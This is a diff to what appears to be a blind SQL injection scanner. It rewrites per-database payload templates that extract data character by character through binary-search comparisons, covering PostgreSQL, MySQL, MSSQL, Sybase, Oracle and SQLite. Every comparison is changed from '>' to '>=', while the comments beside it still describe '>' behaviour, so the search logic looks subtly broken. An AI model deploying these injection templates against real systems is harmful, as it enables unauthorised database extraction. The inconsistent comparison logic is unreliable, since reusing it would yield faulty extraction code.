@@ -97438,7 +97438,7 @@ class ScannerV11(ScannerV10):
                         _dbms11 = getattr(self_._result, "dbms", "PostgreSQL") or "PostgreSQL"
                         # DBMS-correct char/length functions — was only PostgreSQL+MySQL
                         if _dbms11 in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
-                            _ctpl11 = "ASCII(SUBSTRING(({q}),{p},1))>{m}"
+                            _ctpl11 = "ASCII(SUBSTRING(({q}),{p},1))>={m}"
                             # BUG-V11-LTPL-PG-MYSQL FIX (HIGH): LENGTH() returns byte count for
                             # UTF-8; CHAR_LENGTH() returns character count (code-point count).
                             # For strings with multi-byte chars (é=2B, CJK=3B, emoji=4B) LENGTH()
@@ -97447,15 +97447,15 @@ class ScannerV11(ScannerV10):
                             # it NULL > mid is UNKNOWN, not False, causing non-convergence.
                             # Numeric safety: COALESCE/CHAR_LENGTH return integers; {m} is always
                             # a plain integer literal in the comparison; no string delimiters touched.
-                            _ltpl11 = "COALESCE(CHAR_LENGTH(({q})),0)>{m}"  # BUG-V11-LTPL-PG-MYSQL FIX
+                            _ltpl11 = "COALESCE(CHAR_LENGTH(({q})),0)>={m}"  # BUG-V11-LTPL-PG-MYSQL FIX
                         elif _dbms11 in ("MySQL", "MariaDB"):
-                            _ctpl11 = "ORD(MID(({q}),{p},1))>{m}"
+                            _ctpl11 = "ORD(MID(({q}),{p},1))>={m}"
                             # BUG-V11-LTPL-PG-MYSQL FIX (HIGH): same byte-vs-char issue as PG above.
                             # MySQL LENGTH() returns bytes; CHAR_LENGTH() returns characters.
                             # COALESCE guards NULL-returning subqueries.
-                            _ltpl11 = "COALESCE(CHAR_LENGTH(({q})),0)>{m}"  # BUG-V11-LTPL-PG-MYSQL FIX
+                            _ltpl11 = "COALESCE(CHAR_LENGTH(({q})),0)>={m}"  # BUG-V11-LTPL-PG-MYSQL FIX
                         elif _dbms11 == "MSSQL":
-                            _ctpl11 = "UNICODE(SUBSTRING(({q}),{p},1))>{m}"
+                            _ctpl11 = "UNICODE(SUBSTRING(({q}),{p},1))>={m}"
                             # BUG-V11-LTPL-MSSQL-SYBASE FIX (HIGH): LEN() in SQL Server strips
                             # trailing spaces (LEN('hello   ')=5 not 8), silently truncating any
                             # CHAR(N) column or string ending with spaces. No ISNULL guard means
@@ -97465,14 +97465,14 @@ class ScannerV11(ScannerV10):
                             # DATALENGTH counts every byte including trailing-space padding;
                             # CONVERT(NVARCHAR(MAX)) normalises to Unicode; /2 converts byte→char;
                             # ISNULL guards NULL. Numeric safety: result is integer; {m} is int.
-                            _ltpl11 = "ISNULL(DATALENGTH(CONVERT(NVARCHAR(MAX),({q})))/2,0)>{m}"  # BUG-V11-LTPL-MSSQL-SYBASE FIX
+                            _ltpl11 = "ISNULL(DATALENGTH(CONVERT(NVARCHAR(MAX),({q})))/2,0)>={m}"  # BUG-V11-LTPL-MSSQL-SYBASE FIX
                         elif _dbms11 == "Sybase":
-                            _ctpl11 = "UNICODE(SUBSTRING(({q}),{p},1))>{m}"
+                            _ctpl11 = "UNICODE(SUBSTRING(({q}),{p},1))>={m}"
                             # BUG-V11-LTPL-MSSQL-SYBASE FIX (HIGH): same trailing-space and NULL
                             # issues as MSSQL above. Sybase DATALENGTH() counts bytes including
                             # trailing spaces; ISNULL guards NULL. No /2 since Sybase VARCHAR is
                             # 1 byte/char (unlike MSSQL NVARCHAR which is 2 bytes/BMP char).
-                            _ltpl11 = "ISNULL(DATALENGTH(({q})),0)>{m}"  # BUG-V11-LTPL-MSSQL-SYBASE FIX
+                            _ltpl11 = "ISNULL(DATALENGTH(({q})),0)>={m}"  # BUG-V11-LTPL-MSSQL-SYBASE FIX
                         elif _dbms11 == "Oracle":
                             # BUG-V11-ORACLE-CTPL FIX (MEDIUM-HIGH): Oracle's bare ASCII()
                             # returns NULL for code points > 127 (non-ASCII characters).
@@ -97490,7 +97490,7 @@ class ScannerV11(ScannerV10):
                                        "WHEN c__ IS NOT NULL AND LENGTH(c__)>0 "
                                        "THEN TO_NUMBER(SUBSTR(ASCIISTR(c__),2,4),'XXXX') "
                                        "ELSE 0 END FROM "
-                                       "(SELECT SUBSTR(({q}),{p},1) c__ FROM DUAL))>{m}")
+                                       "(SELECT SUBSTR(({q}),{p},1) c__ FROM DUAL))>={m}")
                             # BUG-V11-LTPL-ORACLE-NVL FIX (MEDIUM): LENGTHC(NULL) returns NULL
                             # in Oracle. NULL > mid is UNKNOWN (not False) in Oracle SQL —
                             # the binary-search length probe never converges for NULL-valued
@@ -97499,9 +97499,9 @@ class ScannerV11(ScannerV10):
                             # False for every mid probe → binary search converges at 0 → EOS.
                             # LENGTHC (not LENGTH) is NLS-independent Unicode code-point count.
                             # Numeric safety: NVL/LENGTHC return integers; {m} is a plain int.
-                            _ltpl11 = "NVL(LENGTHC(({q})),0)>{m}"  # BUG-V11-LTPL-ORACLE-NVL FIX
+                            _ltpl11 = "NVL(LENGTHC(({q})),0)>={m}"  # BUG-V11-LTPL-ORACLE-NVL FIX
                         elif _dbms11 == "SQLite":
-                            _ctpl11 = "UNICODE(SUBSTR(({q}),{p},1))>{m}"
+                            _ctpl11 = "UNICODE(SUBSTR(({q}),{p},1))>={m}"
                             # BUG-V11-LTPL-SQLITE-COALESCE FIX (MEDIUM): SQLite LENGTH(NULL)
                             # returns NULL; NULL > mid evaluates to NULL (falsy) not False.
                             # For nullable columns the length oracle always evaluates falsy →
@@ -97509,12 +97509,12 @@ class ScannerV11(ScannerV10):
                             # Fix: COALESCE(LENGTH(...),0) converts NULL → 0, matching the
                             # pattern used by _extract_via_detection_template for SQLite.
                             # Numeric safety: COALESCE/LENGTH return integers; {m} is int.
-                            _ltpl11 = "COALESCE(LENGTH(({q})),0)>{m}"  # BUG-V11-LTPL-SQLITE-COALESCE FIX
+                            _ltpl11 = "COALESCE(LENGTH(({q})),0)>={m}"  # BUG-V11-LTPL-SQLITE-COALESCE FIX
                         else:
-                            _ctpl11 = "ASCII(SUBSTRING(({q}),{p},1))>{m}"
+                            _ctpl11 = "ASCII(SUBSTRING(({q}),{p},1))>={m}"
                             # COALESCE guard for generic/unknown DBMS — consistent with all
                             # other extraction engines; prevents NULL non-convergence.
-                            _ltpl11 = "COALESCE(LENGTH(({q})),0)>{m}"
+                            _ltpl11 = "COALESCE(LENGTH(({q})),0)>={m}"
                         # BUG-V11ENUM-PROBE11-MISSING-LIGHT-VARY FIX (CRITICAL, all 5 DBMSes,
                         # all surfaces including BG header injection, all HTTP methods):
                         # _probe11() sent every binary-search timing probe WITHOUT calling
